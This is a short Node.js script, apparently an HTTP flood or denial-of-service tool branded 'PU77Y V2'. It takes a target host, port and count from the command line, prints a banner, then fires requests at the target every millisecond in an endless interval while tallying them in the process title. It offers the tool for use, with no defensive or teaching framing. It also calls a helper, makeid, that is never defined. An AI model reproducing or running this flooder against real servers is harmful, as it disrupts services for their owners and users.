const request = require('request')
const pu77y = require('./bin')
var target = process.argv[2]
var port = process.argv[3]
var rek = process.argv[4]


process.title = "PU77Y V2 - F4LL [Status = Charging...]"

let sended = 0
console.log(`\n\n                    \x1b[37m|-------------------------------------------|`)
console.log(`                    |                                           |`)
console.log(`                    |          [\x1b[32m+\x1b[37m] --> \x1b[36m${target}\x1b[37m                  |`)
console.log(`                    |                [\x1b[35mPU77Y\x1b[37m]                    |`)
console.log(`                    |                                           |`)
console.log(`                    |-------------------------------------------|`)


    let inter = setInterval(()=>{
	let att = makeid(4)
	pu77y('http://'+target+':'+port, rek, 1)
	sended++
	process.title = "PU77Y V2 - F4LL [Requests : "+sended+"]"
}, 1)

